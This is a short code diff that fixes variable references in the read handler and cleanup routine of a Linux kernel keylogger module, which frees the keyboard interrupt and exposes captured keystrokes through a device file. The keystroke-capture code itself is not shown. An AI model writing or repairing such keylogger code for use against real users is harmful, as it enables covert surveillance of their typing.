@@ -49,7 +49,7 @@ static ssize_t handle_read(struct file *file, char __user *to, size_t size, loff
 {
 	if (!keylogger_data.log_buffer)
 		return (0);
-	return simple_read_from_buffer(to, size, _offset, keylogger_data.log_buffer, strlen(log_buffer));
+	return simple_read_from_buffer(to, size, _offset, keylogger_data.log_buffer, strlen(keylogger_data.log_buffer));
 }
 
 
@@ -89,8 +89,8 @@ static void __exit cleanup(void)
 {
 	misc_deregister(&misc_dev);
 	free_irq(1, &keylogger_data);
-	if (log_buffer)
-		vfree(log_buffer);
+	if (keylogger_data.log_buffer)
+		vfree(keylogger_data.log_buffer);
 }
 
 module_init(init);
